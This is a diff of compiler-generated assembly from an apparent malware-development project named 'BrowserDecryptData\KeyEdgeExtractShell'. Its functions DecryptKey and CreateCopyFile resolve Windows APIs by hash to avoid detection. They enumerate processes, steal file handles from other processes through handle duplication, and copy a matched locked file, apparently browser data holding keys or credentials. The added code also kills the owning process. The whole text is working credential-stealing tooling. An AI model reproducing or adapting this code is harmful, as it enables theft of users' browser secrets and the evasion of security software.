 	call	?FreeMemory@@YA_NPEAX@Z			; FreeMemory
-; Line 756
+; Line 775
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 $LN1@DecryptKey:
-	add	rsp, 3824				; 00000ef0H
+	add	rsp, 3840				; 00000f00H
 	pop	rdi
 	ret	0
 ?DecryptKey@@YAXXZ ENDP					; DecryptKey
@@ -1352,32 +1392,34 @@ $T1 = 72
 $T2 = 73
 $T3 = 74
 $T4 = 75
-size$5 = 76
-bytesRead$6 = 80
+$T5 = 76
+$T6 = 77
+size$7 = 80
+bytesRead$8 = 84
 lpKernel32$ = 88
-hCopy$7 = 96
+hCopy$9 = 96
 pCloseHandle$ = 104
-bufferProcessInfo$8 = 112
-st$9 = 120
-retLen$10 = 124
-hProc$11 = 128
+bufferProcessInfo$10 = 112
+st$11 = 120
+retLen$12 = 124
+hProc$13 = 128
 tv192 = 136
-newSize$12 = 140
-len$13 = 144
-bytesWritten$14 = 148
-i$15 = 152
-i$16 = 160
-offset$17 = 168
+newSize$14 = 140
+len$15 = 144
+bytesWritten$16 = 148
+offset$17 = 152
+i$18 = 160
+i$19 = 168
 processName$ = 176
-pid$18 = 200
-dupOk$19 = 204
-ok$20 = 208
-err$21 = 212
-hOut$22 = 216
-newBuffer$23 = 224
-info$24 = 232
-pGetFileType$25 = 240
-result$26 = 248
+pid$20 = 200
+dupOk$21 = 204
+ok$22 = 208
+err$23 = 212
+hOut$24 = 216
+result$25 = 224
+newBuffer$26 = 232
+info$27 = 240
+pGetFileType$28 = 248
 hashKernel32$ = 256
 hashMessageBoxA$ = 260
 hashGetLastError$ = 264
@@ -1385,56 +1427,60 @@ hashCloseHandle$ = 268
 hashNtdll$ = 272
 hashNtQueryInformationProcess$ = 276
 hashOpenProcess$ = 280
-hashDuplicateHandle$27 = 284
-hashGetFileType$28 = 288
-hashGetFinalPathNameByHandleA$29 = 292
-hashCreateFileA$30 = 296
-hashReadFile$31 = 300
-lpNtdll$ = 304
-count$ = 312
-pOpenProcess$ = 320
-tv170 = 328
-pNtQueryInformationProcess$ = 336
-tv186 = 344
-tv203 = 352
-tv208 = 360
-h$32 = 368
-pDuplicateHandle$33 = 376
-handle$34 = 384
-tv228 = 392
-tv239 = 400
-tv244 = 408
-pGetFinalPathNameByHandleA$35 = 416
-tv290 = 424
-tv296 = 432
-tv306 = 440
-pCreateFileA$36 = 448
-tv319 = 456
-tv324 = 464
-tv328 = 472
-pReadFile$37 = 480
-tv348 = 488
-pGetLastError$ = 496
-pWriteFile$38 = 504
-tv364 = 512
-tv372 = 520
-tv375 = 528
-hashWriteFile$39 = 536
-pMessageBoxA$ = 544
-ov$40 = 552
-path$41 = 592
-pids$ = 864
-buffer$42 = 1888
-filename$ = 6000
-newFileName$ = 6008
+hashDuplicateHandle$29 = 284
+hashGetFileType$30 = 288
+hashGetFinalPathNameByHandleA$31 = 292
+hashTerminateProcess$32 = 296
+hashCreateFileA$33 = 300
+hashReadFile$34 = 304
+lpNtdll$ = 312
+count$ = 320
+pOpenProcess$ = 328
+tv170 = 336
+pNtQueryInformationProcess$ = 344
+tv186 = 352
+tv203 = 360
+tv208 = 368
+h$35 = 376
+pDuplicateHandle$36 = 384
+handle$37 = 392
+tv228 = 400
+tv239 = 408
+tv244 = 416
+pGetFinalPathNameByHandleA$38 = 424
+tv290 = 432
+tv296 = 440
+tv306 = 448
+tv309 = 456
+pTerminateProcess$39 = 464
+tv317 = 472
+pCreateFileA$40 = 480
+tv332 = 488
+tv337 = 496
+tv341 = 504
+pReadFile$41 = 512
+tv361 = 520
+pGetLastError$ = 528
+pWriteFile$42 = 536
+tv377 = 544
+tv385 = 552
+tv388 = 560
+hashWriteFile$43 = 568
+pMessageBoxA$ = 576
+ov$44 = 584
+path$45 = 624
+pids$ = 896
+buffer$46 = 1920
+filename$ = 6032
+newFileName$ = 6040
 ?CreateCopyFile@@YA_NPEAD0@Z PROC			; CreateCopyFile
 ; File C:\Users\vuong\Documents\GitHub\MalDev\BrowserDecryptData\KeyEdgeExtractShell\main.cpp
 ; Line 176
-$LN34:
+$LN36:
 	mov	QWORD PTR [rsp+16], rdx
 	mov	QWORD PTR [rsp+8], rcx
 	push	rdi
-	mov	eax, 5984				; 00001760H
+	mov	eax, 6016				; 00001780H
 	call	__chkstk
 	sub	rsp, rax
 ; Line 177
@@ -1526,41 +1572,41 @@ $LN34:
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pOpenProcess$[rsp], rax
 ; Line 223
-	mov	QWORD PTR i$15[rsp], 0
+	mov	QWORD PTR i$18[rsp], 0
 	jmp	SHORT $LN4@CreateCopy
 $LN2@CreateCopy:
-	mov	rax, QWORD PTR i$15[rsp]
+	mov	rax, QWORD PTR i$18[rsp]
 	inc	rax
-	mov	QWORD PTR i$15[rsp], rax
+	mov	QWORD PTR i$18[rsp], rax
 $LN4@CreateCopy:
 	mov	rax, QWORD PTR count$[rsp]
-	cmp	QWORD PTR i$15[rsp], rax
+	cmp	QWORD PTR i$18[rsp], rax
 	jae	$LN3@CreateCopy
 ; Line 224
-	mov	rax, QWORD PTR i$15[rsp]
+	mov	rax, QWORD PTR i$18[rsp]
 	mov	eax, DWORD PTR pids$[rsp+rax*4]
-	mov	DWORD PTR pid$18[rsp], eax
+	mov	DWORD PTR pid$20[rsp], eax
 ; Line 225
 	mov	rax, QWORD PTR pOpenProcess$[rsp]
 	mov	QWORD PTR tv170[rsp], rax
-	mov	r8d, DWORD PTR pid$18[rsp]
+	mov	r8d, DWORD PTR pid$20[rsp]
 	xor	edx, edx
 	mov	ecx, 2097151				; 001fffffH
 	call	QWORD PTR tv170[rsp]
-	mov	QWORD PTR hProc$11[rsp], rax
+	mov	QWORD PTR hProc$13[rsp], rax
 ; Line 231
-	cmp	QWORD PTR hProc$11[rsp], 0
+	cmp	QWORD PTR hProc$13[rsp], 0
 	jne	SHORT $LN12@CreateCopy
 ; Line 232
 	jmp	SHORT $LN2@CreateCopy
 $LN12@CreateCopy:
 ; Line 235
-	mov	DWORD PTR size$5[rsp], 65536		; 00010000H
+	mov	DWORD PTR size$7[rsp], 65536		; 00010000H
 ; Line 236
-	mov	QWORD PTR bufferProcessInfo$8[rsp], 0
+	mov	QWORD PTR bufferProcessInfo$10[rsp], 0
 ; Line 237
-	mov	eax, DWORD PTR size$5[rsp]
-	lea	rdx, QWORD PTR bufferProcessInfo$8[rsp]
+	mov	eax, DWORD PTR size$7[rsp]
+	lea	rdx, QWORD PTR bufferProcessInfo$10[rsp]
 	mov	ecx, eax
 	call	?AllocMemory@@YA_N_KPEAPEAX@Z		; AllocMemory
 	movzx	eax, al
@@ -1570,7 +1616,7 @@ $LN12@CreateCopy:
 	jmp	$LN2@CreateCopy
 $LN13@CreateCopy:
 ; Line 241
-	mov	DWORD PTR retLen$10[rsp], 0
+	mov	DWORD PTR retLen$12[rsp], 0
 $LN5@CreateCopy:
 ; Line 244
 	xor	eax, eax
@@ -1579,57 +1625,57 @@ $LN5@CreateCopy:
 ; Line 246
 	mov	rax, QWORD PTR pNtQueryInformationProcess$[rsp]
 	mov	QWORD PTR tv186[rsp], rax
-	lea	rax, QWORD PTR retLen$10[rsp]
+	lea	rax, QWORD PTR retLen$12[rsp]
 	mov	QWORD PTR [rsp+32], rax
-	mov	r9d, DWORD PTR size$5[rsp]
-	mov	r8, QWORD PTR bufferProcessInfo$8[rsp]
+	mov	r9d, DWORD PTR size$7[rsp]
+	mov	r8, QWORD PTR bufferProcessInfo$10[rsp]
 	mov	edx, 51					; 00000033H
-	mov	rcx, QWORD PTR hProc$11[rsp]
+	mov	rcx, QWORD PTR hProc$13[rsp]
 	call	QWORD PTR tv186[rsp]
-	mov	DWORD PTR st$9[rsp], eax
+	mov	DWORD PTR st$11[rsp], eax
 ; Line 254
-	cmp	DWORD PTR st$9[rsp], 0
+	cmp	DWORD PTR st$11[rsp], 0
 	jne	SHORT $LN14@CreateCopy
 ; Line 255
 	jmp	$LN6@CreateCopy
 $LN14@CreateCopy:
 ; Line 257
-	cmp	DWORD PTR st$9[rsp], -1073741820	; ffffffffc0000004H
+	cmp	DWORD PTR st$11[rsp], -1073741820	; ffffffffc0000004H
 	je	SHORT $LN16@CreateCopy
-	cmp	DWORD PTR st$9[rsp], -1073741789	; ffffffffc0000023H
+	cmp	DWORD PTR st$11[rsp], -1073741789	; ffffffffc0000023H
 	jne	$LN15@CreateCopy
 $LN16@CreateCopy:
 ; Line 260
-	mov	eax, DWORD PTR size$5[rsp]
-	cmp	DWORD PTR retLen$10[rsp], eax
-	jbe	SHORT $LN32@CreateCopy
-	mov	eax, DWORD PTR retLen$10[rsp]
+	mov	eax, DWORD PTR size$7[rsp]
+	cmp	DWORD PTR retLen$12[rsp], eax
+	jbe	SHORT $LN34@CreateCopy
+	mov	eax, DWORD PTR retLen$12[rsp]
 	mov	DWORD PTR tv192[rsp], eax
-	jmp	SHORT $LN33@CreateCopy
-$LN32@CreateCopy:
-	mov	eax, DWORD PTR size$5[rsp]
+	jmp	SHORT $LN35@CreateCopy
+$LN34@CreateCopy:
+	mov	eax, DWORD PTR size$7[rsp]
 	shl	eax, 1
 	mov	DWORD PTR tv192[rsp], eax
-$LN33@CreateCopy:
+$LN35@CreateCopy:
 	mov	eax, DWORD PTR tv192[rsp]
-	mov	DWORD PTR newSize$12[rsp], eax
+	mov	DWORD PTR newSize$14[rsp], eax
 ; Line 261
-	mov	QWORD PTR newBuffer$23[rsp], 0
+	mov	QWORD PTR newBuffer$26[rsp], 0
 ; Line 262
-	mov	eax, DWORD PTR newSize$12[rsp]
-	lea	rdx, QWORD PTR newBuffer$23[rsp]
+	mov	eax, DWORD PTR newSize$14[rsp]
+	lea	rdx, QWORD PTR newBuffer$26[rsp]
 	mov	ecx, eax
 	call	?AllocMemory@@YA_N_KPEAPEAX@Z		; AllocMemory
 	movzx	eax, al
 	test	eax, eax
 	jne	SHORT $LN17@CreateCopy
 ; Line 263
-	mov	rcx, QWORD PTR bufferProcessInfo$8[rsp]
+	mov	rcx, QWORD PTR bufferProcessInfo$10[rsp]
 	call	?FreeMemory@@YA_NPEAX@Z			; FreeMemory
 ; Line 264
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
 	mov	QWORD PTR tv203[rsp], rax
-	mov	rcx, QWORD PTR hProc$11[rsp]
+	mov	rcx, QWORD PTR hProc$13[rsp]
 	call	QWORD PTR tv203[rsp]
 	npad	1
 ; Line 265
@@ -1640,24 +1686,24 @@ $LN33@CreateCopy:
 	jmp	$LN1@CreateCopy
 $LN17@CreateCopy:
 ; Line 268
-	mov	rcx, QWORD PTR bufferProcessInfo$8[rsp]
+	mov	rcx, QWORD PTR bufferProcessInfo$10[rsp]
 	call	?FreeMemory@@YA_NPEAX@Z			; FreeMemory
 ; Line 269
-	mov	eax, DWORD PTR newSize$12[rsp]
-	mov	DWORD PTR size$5[rsp], eax
+	mov	eax, DWORD PTR newSize$14[rsp]
+	mov	DWORD PTR size$7[rsp], eax
 ; Line 270
-	mov	rax, QWORD PTR newBuffer$23[rsp]
-	mov	QWORD PTR bufferProcessInfo$8[rsp], rax
+	mov	rax, QWORD PTR newBuffer$26[rsp]
+	mov	QWORD PTR bufferProcessInfo$10[rsp], rax
 ; Line 271
 	jmp	$LN5@CreateCopy
 $LN15@CreateCopy:
 ; Line 274
-	mov	rcx, QWORD PTR bufferProcessInfo$8[rsp]
+	mov	rcx, QWORD PTR bufferProcessInfo$10[rsp]
 	call	?FreeMemory@@YA_NPEAX@Z			; FreeMemory
 ; Line 275
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
 	mov	QWORD PTR tv208[rsp], rax
-	mov	rcx, QWORD PTR hProc$11[rsp]
+	mov	rcx, QWORD PTR hProc$13[rsp]
 	call	QWORD PTR tv208[rsp]
 	npad	1
 ; Line 276
@@ -1670,159 +1716,196 @@ $LN15@CreateCopy:
 	jmp	$LN5@CreateCopy
 $LN6@CreateCopy:
 ; Line 279
-	mov	rax, QWORD PTR bufferProcessInfo$8[rsp]
-	mov	QWORD PTR info$24[rsp], rax
+	mov	rax, QWORD PTR bufferProcessInfo$10[rsp]
+	mov	QWORD PTR info$27[rsp], rax
 ; Line 282
-	mov	QWORD PTR i$16[rsp], 0
+	mov	QWORD PTR i$19[rsp], 0
 	jmp	SHORT $LN9@CreateCopy
 $LN7@CreateCopy:
-	mov	rax, QWORD PTR i$16[rsp]
+	mov	rax, QWORD PTR i$19[rsp]
 	inc	rax
-	mov	QWORD PTR i$16[rsp], rax
+	mov	QWORD PTR i$19[rsp], rax
 $LN9@CreateCopy:
-	mov	rax, QWORD PTR info$24[rsp]
+	mov	rax, QWORD PTR info$27[rsp]
 	mov	rax, QWORD PTR [rax]
-	cmp	QWORD PTR i$16[rsp], rax
+	cmp	QWORD PTR i$19[rsp], rax
 	jae	$LN8@CreateCopy
 ; Line 283
-	imul	rax, QWORD PTR i$16[rsp], 40		; 00000028H
-	mov	rcx, QWORD PTR info$24[rsp]
+	imul	rax, QWORD PTR i$19[rsp], 40		; 00000028H
+	mov	rcx, QWORD PTR info$27[rsp]
 	lea	rax, QWORD PTR [rcx+rax+16]
-	mov	QWORD PTR h$32[rsp], rax
+	mov	QWORD PTR h$35[rsp], rax
 ; Line 284
-	mov	rax, QWORD PTR h$32[rsp]
+	mov	rax, QWORD PTR h$35[rsp]
 	mov	rax, QWORD PTR [rax]
-	mov	QWORD PTR handle$34[rsp], rax
+	mov	QWORD PTR handle$37[rsp], rax
 ; Line 286
-	mov	QWORD PTR hCopy$7[rsp], 0
+	mov	QWORD PTR hCopy$9[rsp], 0
 ; Line 287
-	mov	DWORD PTR hashDuplicateHandle$27[rsp], 1017292957 ; 3ca2a89dH
+	mov	DWORD PTR hashDuplicateHandle$29[rsp], 1017292957 ; 3ca2a89dH
 ; Line 291
 	mov	r8d, 1017292957				; 3ca2a89dH
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pDuplicateHandle$33[rsp], rax
+	mov	QWORD PTR pDuplicateHandle$36[rsp], rax
 ; Line 293
-	mov	rax, QWORD PTR pDuplicateHandle$33[rsp]
+	mov	rax, QWORD PTR pDuplicateHandle$36[rsp]
 	mov	QWORD PTR tv228[rsp], rax
 	mov	DWORD PTR [rsp+48], 2
 	mov	DWORD PTR [rsp+40], 0
 	mov	DWORD PTR [rsp+32], 0
-	lea	r9, QWORD PTR hCopy$7[rsp]
+	lea	r9, QWORD PTR hCopy$9[rsp]
 	mov	r8, -1
-	mov	rdx, QWORD PTR handle$34[rsp]
-	mov	rcx, QWORD PTR hProc$11[rsp]
+	mov	rdx, QWORD PTR handle$37[rsp]
+	mov	rcx, QWORD PTR hProc$13[rsp]
 	call	QWORD PTR tv228[rsp]
-	mov	DWORD PTR dupOk$19[rsp], eax
-; Line 304
-	cmp	DWORD PTR dupOk$19[rsp], 0
+	mov	DWORD PTR dupOk$21[rsp], eax
+; Line 303
+	cmp	DWORD PTR dupOk$21[rsp], 0
 	je	SHORT $LN19@CreateCopy
-	cmp	QWORD PTR hCopy$7[rsp], 0
+	cmp	QWORD PTR hCopy$9[rsp], 0
 	jne	SHORT $LN18@CreateCopy
 $LN19@CreateCopy:
-; Line 305
+; Line 304
 	jmp	$LN7@CreateCopy
 $LN18@CreateCopy:
+; Line 307
+	mov	DWORD PTR hashGetFileType$30[rsp], 1507700099 ; 59ddad83H
 ; Line 309
-	mov	DWORD PTR hashGetFileType$28[rsp], 1507700099 ; 59ddad83H
-; Line 311
 	mov	r8d, 1507700099				; 59ddad83H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pGetFileType$25[rsp], rax
-; Line 313
-	cmp	QWORD PTR pGetFileType$25[rsp], 0
+	mov	QWORD PTR pGetFileType$28[rsp], rax
+; Line 311
+	cmp	QWORD PTR pGetFileType$28[rsp], 0
 	je	SHORT $LN21@CreateCopy
-	mov	rax, QWORD PTR pGetFileType$25[rsp]
+	mov	rax, QWORD PTR pGetFileType$28[rsp]
 	mov	QWORD PTR tv239[rsp], rax
-	mov	rcx, QWORD PTR hCopy$7[rsp]
+	mov	rcx, QWORD PTR hCopy$9[rsp]
 	call	QWORD PTR tv239[rsp]
 	cmp	eax, 1
 	je	SHORT $LN20@CreateCopy
 $LN21@CreateCopy:
-; Line 314
+; Line 312
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
 	mov	QWORD PTR tv244[rsp], rax
-	mov	rcx, QWORD PTR hCopy$7[rsp]
+	mov	rcx, QWORD PTR hCopy$9[rsp]
 	call	QWORD PTR tv244[rsp]
 	npad	1
-; Line 315
+; Line 313
 	jmp	$LN7@CreateCopy
 $LN20@CreateCopy:
-; Line 318
-	lea	rax, QWORD PTR path$41[rsp]
+; Line 316
+	lea	rax, QWORD PTR path$45[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 319
-	mov	DWORD PTR hashGetFinalPathNameByHandleA$29[rsp], 203739171 ; 0c24d023H
-; Line 326
+; Line 317
+	mov	DWORD PTR hashGetFinalPathNameByHandleA$31[rsp], 203739171 ; 0c24d023H
+; Line 324
 	mov	r8d, 203739171				; 0c24d023H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pGetFinalPathNameByHandleA$35[rsp], rax
-; Line 330
-	mov	rax, QWORD PTR pGetFinalPathNameByHandleA$35[rsp]
+	mov	QWORD PTR pGetFinalPathNameByHandleA$38[rsp], rax
+; Line 327
+	mov	rax, QWORD PTR pGetFinalPathNameByHandleA$38[rsp]
 	mov	QWORD PTR tv290[rsp], rax
 	xor	r9d, r9d
 	mov	r8d, 260				; 00000104H
-	lea	rdx, QWORD PTR path$41[rsp]
-	mov	rcx, QWORD PTR hCopy$7[rsp]
+	lea	rdx, QWORD PTR path$45[rsp]
+	mov	rcx, QWORD PTR hCopy$9[rsp]
 	call	QWORD PTR tv290[rsp]
-	mov	DWORD PTR len$13[rsp], eax
-; Line 337
-	cmp	DWORD PTR len$13[rsp], 0
+	mov	DWORD PTR len$15[rsp], eax
+; Line 334
+	cmp	DWORD PTR len$15[rsp], 0
 	je	SHORT $LN23@CreateCopy
-	cmp	DWORD PTR len$13[rsp], 260		; 00000104H
+	cmp	DWORD PTR len$15[rsp], 260		; 00000104H
 	jb	SHORT $LN22@CreateCopy
 $LN23@CreateCopy:
-; Line 338
+; Line 335
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
 	mov	QWORD PTR tv296[rsp], rax
-	mov	rcx, QWORD PTR hCopy$7[rsp]
+	mov	rcx, QWORD PTR hCopy$9[rsp]
 	call	QWORD PTR tv296[rsp]
 	npad	1
-; Line 339
+; Line 336
 	jmp	$LN7@CreateCopy
 $LN22@CreateCopy:
-; Line 341
-	mov	QWORD PTR result$26[rsp], 0
-; Line 342
+; Line 338
+	mov	QWORD PTR result$25[rsp], 0
+; Line 339
 	mov	rcx, QWORD PTR filename$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
-	lea	r9, QWORD PTR result$26[rsp]
+	lea	r9, QWORD PTR result$25[rsp]
 	mov	r8, rax
 	mov	rdx, QWORD PTR filename$[rsp]
-	lea	rcx, QWORD PTR path$41[rsp]
+	lea	rcx, QWORD PTR path$45[rsp]
 	call	?FindPatternA@@YA_NPEBD0_KPEAPEAD@Z	; FindPatternA
 	npad	1
-; Line 343
-	cmp	QWORD PTR result$26[rsp], 0
+; Line 340
+	cmp	QWORD PTR result$25[rsp], 0
 	jne	SHORT $LN24@CreateCopy
-; Line 344
+; Line 341
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
 	mov	QWORD PTR tv306[rsp], rax
-	mov	rcx, QWORD PTR hCopy$7[rsp]
+	mov	rcx, QWORD PTR hCopy$9[rsp]
 	call	QWORD PTR tv306[rsp]
 	npad	1
-; Line 345
+; Line 342
 	jmp	$LN7@CreateCopy
 $LN24@CreateCopy:
+; Line 345
+	mov	rax, QWORD PTR pCloseHandle$[rsp]
+	mov	QWORD PTR tv309[rsp], rax
+	mov	rcx, QWORD PTR hCopy$9[rsp]
+	call	QWORD PTR tv309[rsp]
+; Line 346
+	mov	DWORD PTR hashTerminateProcess$32[rsp], 714377597 ; 2a94897dH
 ; Line 348
-	mov	DWORD PTR hashCreateFileA$30[rsp], 896765632 ; 35738ec0H
+	mov	r8d, 714377597				; 2a94897dH
+	mov	rdx, QWORD PTR lpKernel32$[rsp]
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
+	mov	QWORD PTR pTerminateProcess$39[rsp], rax
+; Line 349
+	mov	rax, QWORD PTR pTerminateProcess$39[rsp]
+	mov	QWORD PTR tv317[rsp], rax
+	xor	edx, edx
+	mov	rcx, QWORD PTR hProc$13[rsp]
+	call	QWORD PTR tv317[rsp]
+	test	eax, eax
+	je	SHORT $LN25@CreateCopy
 ; Line 350
+	mov	BYTE PTR $T3[rsp], 1
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
+	movzx	eax, BYTE PTR $T3[rsp]
+	jmp	$LN1@CreateCopy
+; Line 351
+	jmp	SHORT $LN26@CreateCopy
+$LN25@CreateCopy:
+; Line 353
+	mov	BYTE PTR $T4[rsp], 0
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
+	movzx	eax, BYTE PTR $T4[rsp]
+	jmp	$LN1@CreateCopy
+$LN26@CreateCopy:
+; Line 355
+	mov	DWORD PTR hashCreateFileA$33[rsp], 896765632 ; 35738ec0H
+; Line 357
 	mov	r8d, 896765632				; 35738ec0H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pCreateFileA$36[rsp], rax
-; Line 352
-	mov	rax, QWORD PTR pCreateFileA$36[rsp]
-	mov	QWORD PTR tv319[rsp], rax
+	mov	QWORD PTR pCreateFileA$40[rsp], rax
+; Line 359
+	mov	rax, QWORD PTR pCreateFileA$40[rsp]
+	mov	QWORD PTR tv332[rsp], rax
 	mov	QWORD PTR [rsp+48], 0
 	mov	DWORD PTR [rsp+40], 128			; 00000080H
 	mov	DWORD PTR [rsp+32], 2
@@ -1830,168 +1913,168 @@ $LN24@CreateCopy:
 	xor	r8d, r8d
 	mov	edx, 1073741824				; 40000000H
 	mov	rcx, QWORD PTR newFileName$[rsp]
-	call	QWORD PTR tv319[rsp]
-	mov	QWORD PTR hOut$22[rsp], rax
-; Line 362
-	cmp	QWORD PTR hOut$22[rsp], -1
-	jne	SHORT $LN25@CreateCopy
-; Line 363
+	call	QWORD PTR tv332[rsp]
+	mov	QWORD PTR hOut$24[rsp], rax
+; Line 369
+	cmp	QWORD PTR hOut$24[rsp], -1
+	jne	SHORT $LN27@CreateCopy
+; Line 370
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
-	mov	QWORD PTR tv324[rsp], rax
-	mov	rcx, QWORD PTR hCopy$7[rsp]
-	call	QWORD PTR tv324[rsp]
-; Line 364
-	mov	rcx, QWORD PTR bufferProcessInfo$8[rsp]
+	mov	QWORD PTR tv337[rsp], rax
+	mov	rcx, QWORD PTR hCopy$9[rsp]
+	call	QWORD PTR tv337[rsp]
+; Line 371
+	mov	rcx, QWORD PTR bufferProcessInfo$10[rsp]
 	call	?FreeMemory@@YA_NPEAX@Z			; FreeMemory
-; Line 365
+; Line 372
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
-	mov	QWORD PTR tv328[rsp], rax
-	mov	rcx, QWORD PTR hProc$11[rsp]
-	call	QWORD PTR tv328[rsp]
+	mov	QWORD PTR tv341[rsp], rax
+	mov	rcx, QWORD PTR hProc$13[rsp]
+	call	QWORD PTR tv341[rsp]
 	npad	1
-; Line 366
-	mov	BYTE PTR $T3[rsp], 0
+; Line 373
+	mov	BYTE PTR $T5[rsp], 0
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
-	movzx	eax, BYTE PTR $T3[rsp]
+	movzx	eax, BYTE PTR $T5[rsp]
 	jmp	$LN1@CreateCopy
-$LN25@CreateCopy:
-; Line 370
-	mov	DWORD PTR bytesRead$6[rsp], 0
-; Line 371
-	mov	DWORD PTR bytesWritten$14[rsp], 0
-; Line 373
+$LN27@CreateCopy:
+; Line 377
+	mov	DWORD PTR bytesRead$8[rsp], 0
+; Line 378
+	mov	DWORD PTR bytesWritten$16[rsp], 0
+; Line 380
 	mov	QWORD PTR offset$17[rsp], 0
 $LN10@CreateCopy:
-; Line 375
+; Line 382
 	xor	eax, eax
 	cmp	eax, 1
 	je	$LN11@CreateCopy
-; Line 376
-	lea	rax, QWORD PTR ov$40[rsp]
+; Line 383
+	lea	rax, QWORD PTR ov$44[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 32					; 00000020H
 	rep stosb
-; Line 377
+; Line 384
 	mov	eax, -1					; ffffffffH
 	mov	rcx, QWORD PTR offset$17[rsp]
 	and	rcx, rax
 	mov	rax, rcx
-	mov	DWORD PTR ov$40[rsp+16], eax
-; Line 378
+	mov	DWORD PTR ov$44[rsp+16], eax
+; Line 385
 	mov	rax, QWORD PTR offset$17[rsp]
 	shr	rax, 32					; 00000020H
-	mov	DWORD PTR ov$40[rsp+20], eax
-; Line 380
-	mov	DWORD PTR hashReadFile$31[rsp], -1576683562 ; a205b7d6H
-; Line 384
+	mov	DWORD PTR ov$44[rsp+20], eax
+; Line 387
+	mov	DWORD PTR hashReadFile$34[rsp], -1576683562 ; a205b7d6H
+; Line 391
 	mov	r8d, -1576683562			; a205b7d6H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pReadFile$37[rsp], rax
-; Line 386
-	mov	rax, QWORD PTR pReadFile$37[rsp]
-	mov	QWORD PTR tv348[rsp], rax
-	lea	rax, QWORD PTR ov$40[rsp]
+	mov	QWORD PTR pReadFile$41[rsp], rax
+; Line 393
+	mov	rax, QWORD PTR pReadFile$41[rsp]
+	mov	QWORD PTR tv361[rsp], rax
+	lea	rax, QWORD PTR ov$44[rsp]
 	mov	QWORD PTR [rsp+32], rax
-	lea	r9, QWORD PTR bytesRead$6[rsp]
+	lea	r9, QWORD PTR bytesRead$8[rsp]
 	mov	r8d, 4096				; 00001000H
-	lea	rdx, QWORD PTR buffer$42[rsp]
-	mov	rcx, QWORD PTR hCopy$7[rsp]
-	call	QWORD PTR tv348[rsp]
-	mov	DWORD PTR ok$20[rsp], eax
-; Line 394
-	cmp	DWORD PTR ok$20[rsp], 0
-	jne	SHORT $LN26@CreateCopy
-; Line 395
-	call	QWORD PTR pGetLastError$[rsp]
-	mov	DWORD PTR err$21[rsp], eax
-; Line 397
-	cmp	DWORD PTR err$21[rsp], 38		; 00000026H
-	jne	SHORT $LN27@CreateCopy
-; Line 398
-	jmp	$LN11@CreateCopy
-$LN27@CreateCopy:
-; Line 400
-	jmp	$LN11@CreateCopy
-$LN26@CreateCopy:
-; Line 403
-	cmp	DWORD PTR bytesRead$6[rsp], 0
+	lea	rdx, QWORD PTR buffer$46[rsp]
+	mov	rcx, QWORD PTR hCopy$9[rsp]
+	call	QWORD PTR tv361[rsp]
+	mov	DWORD PTR ok$22[rsp], eax
+; Line 401
+	cmp	DWORD PTR ok$22[rsp], 0
 	jne	SHORT $LN28@CreateCopy
+; Line 402
+	call	QWORD PTR pGetLastError$[rsp]
+	mov	DWORD PTR err$23[rsp], eax
 ; Line 404
+	cmp	DWORD PTR err$23[rsp], 38		; 00000026H
+	jne	SHORT $LN29@CreateCopy
+; Line 405
+	jmp	$LN11@CreateCopy
+$LN29@CreateCopy:
+; Line 407
 	jmp	$LN11@CreateCopy
 $LN28@CreateCopy:
-; Line 406
-	mov	DWORD PTR hashWriteFile$39[rsp], -339353823 ; ebc5df21H
 ; Line 410
+	cmp	DWORD PTR bytesRead$8[rsp], 0
+	jne	SHORT $LN30@CreateCopy
+; Line 411
+	jmp	$LN11@CreateCopy
+$LN30@CreateCopy:
+; Line 413
+	mov	DWORD PTR hashWriteFile$43[rsp], -339353823 ; ebc5df21H
+; Line 417
 	mov	r8d, -339353823				; ebc5df21H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pWriteFile$38[rsp], rax
-; Line 412
-	mov	rax, QWORD PTR pWriteFile$38[rsp]
